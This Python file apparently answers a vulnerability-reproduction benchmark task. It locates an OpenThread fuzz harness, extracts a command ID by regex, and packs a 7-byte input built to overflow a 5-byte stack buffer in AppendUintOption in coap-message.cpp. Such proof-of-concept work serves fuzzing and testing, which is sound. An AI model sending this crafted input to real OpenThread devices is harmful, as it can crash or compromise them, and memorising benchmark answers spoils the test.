import os
import re
import struct
import tarfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability is a stack buffer overflow in `AppendUintOption` in `coap-message.cpp`.
        The function allocates a small fixed-size buffer (5 bytes) but can write up to 7 bytes 
        (1 byte header + 2 bytes extended delta + 4 bytes value).
        
        We need to identify the command ID mapping in the fuzzer harness and supply 
        arguments that trigger the maximum encoding length.
        """
        # Default command ID for AppendUintOption (commonly 6 in OpenThread fuzzers)
        cmd_id = 6
        
        content = ""
        
        # Attempt to extract harness source code to identify the correct command ID
        try:
            if os.path.isdir(src_path):
                # Search for coap_message.cpp in fuzz directories
                found_path = None
                for root, dirs, files in os.walk(src_path):
                    if "coap_message.cpp" in files and ("fuzz" in root or "tests" in root):
                        current_path = os.path.join(root, "coap_message.cpp")
                        # Prefer the one in 'fuzz' directory if multiple exist
                        if "fuzz" in root:
                            found_path = current_path
                            break
                        if found_path is None:
                            found_path = current_path
                
                if found_path and os.path.exists(found_path):
                    with open(found_path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
            
            elif os.path.isfile(src_path) and (src_path.endswith(".tar.gz") or src_path.endswith(".tgz")):
                # Handle tarball input if provided as a file
                with tarfile.open(src_path, "r:*") as tar:
                    for member in tar.getmembers():
                        if "coap_message.cpp" in member.name and ("fuzz" in member.name or "tests" in member.name):
                            f = tar.extractfile(member)
                            if f:
                                content = f.read().decode("utf-8", errors="ignore")
                            break
        except Exception:
            # If parsing fails, proceed with default ID
            pass

        # Parse the command ID from the source code using regex
        if content:
            # Look for pattern: case <ID>: ... AppendUintOption
            # Use non-greedy match ensuring we don't skip over another 'case'
            regex = r'case\s+(\d+)\s*:(?:(?!case\s+\d).)*?AppendUintOption'
            match = re.search(regex, content, re.DOTALL | re.IGNORECASE)
            if match:
                try:
                    cmd_id = int(match.group(1))
                except ValueError:
                    pass

        # Construct the PoC payload
        # 1. Command ID (1 byte)
        # 2. Option Number (2 bytes, Little Endian): 0xFFFF 
        #    - Ensures Delta is large (>= 269), forcing 2 bytes of extended delta.
        #    - 1 byte header + 2 bytes ext delta = 3 bytes used.
        # 3. Value (4 bytes, Little Endian): 0xFFFFFFFF
        #    - Ensures full 4 bytes are written.
        # Total written: 3 + 4 = 7 bytes. Buffer is 5 bytes -> Overflow.
        
        payload = struct.pack('<BHI', cmd_id, 0xFFFF, 0xFFFFFFFF)
        
        return payload